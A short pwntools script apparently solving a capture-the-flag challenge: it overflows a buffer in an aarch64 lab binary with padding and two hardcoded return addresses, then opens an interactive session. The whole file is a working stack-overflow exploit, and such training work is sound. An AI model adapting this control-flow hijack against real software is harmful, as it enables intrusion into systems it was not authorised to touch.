from pwn import *
context.arch="aarch64"
# exe_name = "/usr/bin/qemu-aarch64-static"
# eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-2-0"]
exe_name = "/challenge/run"
p = process(exe_name)
exp= b"A"*(63) + 0x401EDC.to_bytes(8, "little") + b"A"*0x128 + 0x401F88.to_bytes(8, "little")

p.send(exp)

p.interactive()

